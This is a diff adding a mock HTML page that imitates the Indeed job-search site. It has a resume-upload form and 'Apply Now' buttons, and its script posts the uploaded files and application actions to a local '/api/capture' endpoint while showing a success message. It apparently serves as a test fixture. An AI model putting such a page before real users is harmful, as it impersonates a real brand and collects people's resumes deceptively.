@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Indeed - Job Search</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; background: #f5f5f5; }
+        .header { background: #2164f3; color: white; padding: 16px 24px; }
+        .header h1 { margin: 0; font-size: 24px; }
+        .search-bar { background: white; padding: 16px 24px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .search-bar input { padding: 10px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; width: 300px; margin-right: 8px; }
+        .search-bar button { background: #2164f3; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
+        .content { max-width: 800px; margin: 24px auto; padding: 0 16px; }
+        .job-card { background: white; border: 1px solid #e0e0e0; border-radius: 8px; padding: 16px; margin-bottom: 12px; }
+        .job-card h3 { margin: 0 0 8px; color: #2164f3; }
+        .job-card .company { color: #666; font-size: 14px; }
+        .resume-upload { background: white; border: 1px solid #e0e0e0; border-radius: 8px; padding: 24px; margin-bottom: 16px; text-align: center; }
+        .resume-upload input[type=file] { margin: 12px 0; }
+        .btn { background: #2164f3; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="header"><h1>indeed</h1></div>
+    <div class="search-bar">
+        <input type="text" placeholder="Job title, keywords, or company">
+        <input type="text" placeholder="City, state, or remote">
+        <button>Find Jobs</button>
+    </div>
+    <div class="content">
+        <div class="resume-upload">
+            <h2>Upload Your Resume</h2>
+            <p>Let employers find you. Upload your resume to apply faster.</p>
+            <input type="file" id="resume-file" accept=".pdf,.doc,.docx,.txt">
+            <br>
+            <button class="btn" onclick="uploadResume()">Upload Resume</button>
+        </div>
+        <div class="job-card">
+            <h3>Senior Software Engineer</h3>
+            <div class="company">TechCorp Inc. - Remote</div>
+            <p>$150,000 - $200,000 a year</p>
+            <button class="btn" onclick="applyJob('Senior Software Engineer')">Apply Now</button>
+        </div>
+        <div class="job-card">
+            <h3>DevOps Engineer</h3>
+            <div class="company">CloudScale Systems - San Francisco, CA</div>
+            <p>$140,000 - $180,000 a year</p>
+            <button class="btn" onclick="applyJob('DevOps Engineer')">Apply Now</button>
+        </div>
+    </div>
+    <script>
+        function uploadResume() {
+            const file = document.getElementById('resume-file').files[0];
+            if (!file) return alert('Please select a resume file');
+            const fd = new FormData();
+            fd.append('site', 'indeed.com');
+            fd.append('action', 'upload_resume');
+            fd.append('file', file);
+            fetch('/api/capture', {method: 'POST', body: fd});
+            alert('Resume uploaded successfully!');
+        }
+        function applyJob(title) {
+            fetch('/api/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({site: 'indeed.com', action: 'job_application', job_title: title})
+            });
+        }
+    </script>
+</body>
+</html>
